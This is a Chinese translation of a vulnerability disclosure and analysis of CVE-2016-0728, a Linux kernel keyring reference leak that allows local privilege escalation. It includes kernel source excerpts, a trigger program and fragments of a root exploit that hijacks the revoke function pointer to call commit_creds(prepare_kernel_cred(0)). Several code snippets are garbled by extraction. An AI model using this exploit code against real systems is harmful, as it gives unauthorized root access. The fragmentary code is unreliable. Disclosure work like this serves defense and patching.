# Linux内核漏洞CVE-2016-0728的分析与利用
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
**介绍**
Perception Point研究团队已经在Linux操作系统的内核中发现了一个0
day漏洞,这是一个本地提权漏洞。这个漏洞从2012年开始就存在于Linux的内核中了,但是我们的团队最近才发现了这个漏洞,并将漏洞的详细信息报告给了内核安全团队。在此之后,我们还发布了一个针对此漏洞的概念验证利用实例。截止至漏洞披露的那一天,这个漏洞已经影响了大约数千万的安装了Linux操作系统的个人计算机和服务器。其中有66%的设备是安卓设备(包括手机和平板电脑在内)。目前,我们和内核安全团队都没有发现任何针对此漏洞的攻击事件,我们建议安全团队对所有有可能受此漏洞影响的设备进行测试,并尽快发布相应的修复补丁。
在这篇文章中,我们将会对此漏洞的技术细节进行讨论,并且还会讨论通过这个漏洞来实现内核代码执行的相关技术。最后,我们还会给大家提供相应的[概念验证实例](https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f),并给大家演示如何将本地用户提权至root用户。
**漏洞信息**
[ 漏洞CVE-2016-0728](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-0728)是由相关keyring功能中的引用泄漏所引起的。在我们深入了解该漏洞的详细信息之前,我们还需要了解一些基础背景知识。
在这里,我们直接引用帮助手册中的内容。驱动器在内核中保存或缓存安全数据、认证密钥、加密密钥和一些其他的数据时,必须使用到keyring功能。系统会调用接口-keyctl(当然了,系统中还存在另外两个系统调用,系统会使用这些系统调用来处理密钥:add_key和request_key,但keyctl绝对是这篇文章中最重要的。),在这个功能的帮助下,用户空间中的程序就可以管理相应的对象,并且使用这一机制来满足不同程序所需实现的不同功能。
每一个进程都可以使用keyctl(全名为KEYCTL_JOIN_SESSION_KEYRING)来为当前的会话创建相应的keyring,而且还可以为keyring指定名称,如果不需要指定名称的话,传入NULL参数即可。通过引用相同的keyring名称,程序就可以在不同进程间共享keyring对象了。如果某一进程已经拥有一个会话keyring了,那么这个系统调用便会为其创建一个新的keyring,并替换掉原有的keyring。如果某一对象被多个进程所使用,那么该对象的内部引用计数(该信息存储在一个名为“usage”的数据域中)将会自动增加。当进程尝试使用相同的keyring替换其当前的会话keyring时,泄漏就发生了。我们可以在下面所给出的代码段(代码段来源于内核版本为3.18的Linux内核)中看到,程序的执行将会直接跳转至error2标签处,这样就跳过了key_put函数的调用,并泄漏了keyring的引用信息(由函数find_keyring_by_name生成)。
    long join_session_keyring(const char *name)
    {
     ...
           new = prepare_creds();
     ...
           keyring = find_keyring_by_name(name, false); //find_keyring_by_name increments  keyring->usage if a keyring was found
           if (PTR_ERR(keyring) == -ENOKEY) {
                   /* not found - try and create a new one */
                   keyring = keyring_alloc(
                           name, old->uid, old->gid, old,
                           KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,
                           KEY_ALLOC_IN_QUOTA, NULL);
                   if (IS_ERR(keyring)) {
                           ret = PTR_ERR(keyring);
                           goto error2;
                   }
           } else if (IS_ERR(keyring)) {
                   ret = PTR_ERR(keyring);
                   goto error2;
           } else if (keyring == new->session_keyring) {
                   ret = 0;
                   goto error2; //serial;
           key_put(keyring);
    okay:
           return ret;
    error2:
           mutex_unlock(&key_session_mutex);
    error:
           abort_creds(new);
           return ret;
    }
在用户空间中触发这个漏洞是非常容易的,我们可以在下列的代码段中看到:
    /* $ gcc leak.c -o leak -lkeyutils -Wall */
    /* $ ./leak */
    /* $ cat /proc/keys */
    #include 
    #include 
    #include 
    #include 
    int main(int argc, const char *argv[])
    {
        int i = 0;
        key_serial_t serial;
        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
        if (serial flags) &&
               key->type->revoke)
                   key->type->revoke(key);
           . . .
    }
keyring对象中应该包含以下信息:
相关代码段如下:
    typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
    struct key_type_s {
        void * [12] padding;
        void * revoke;
    } type;
    _commit_creds commit_creds = 0xffffffff81094250;
    _prepare_kernel_cred prepare_kernel_cred = 0xffffffff81094550;
    void userspace_revoke(void * key) {
        commit_creds(prepare_kernel_cred(0));
    }
    int main(int argc, const char *argv[]) {
        ...
        struct key_type * my_key_type = NULL;
        ...
        my_key_type = malloc(sizeof(*my_key_type));
        my_key_type->revoke = (void*)userspace_revoke;
        ...
    }
我们在一台配有英特尔酷睿i7-5500 CPU的设备上进行了测试,整个测试过程花费了大约30分钟的时间,我们所得到的信息如下图所示:
**漏洞缓解方案 &结论**
内核版本为3.8及其以上的Linux内核都会受到这个漏洞的影响。SMEP和SMAP从某种程度上来说可以给予用户提供一定的保护。也许我们会在之后的文章中讨论如何绕过这些缓解措施,但是现在迫在眉睫的事情就是尽快修复这个漏洞。
感谢David Howells和Wade Mealing,以及整个红帽安全团队对这个漏洞所付出的努力。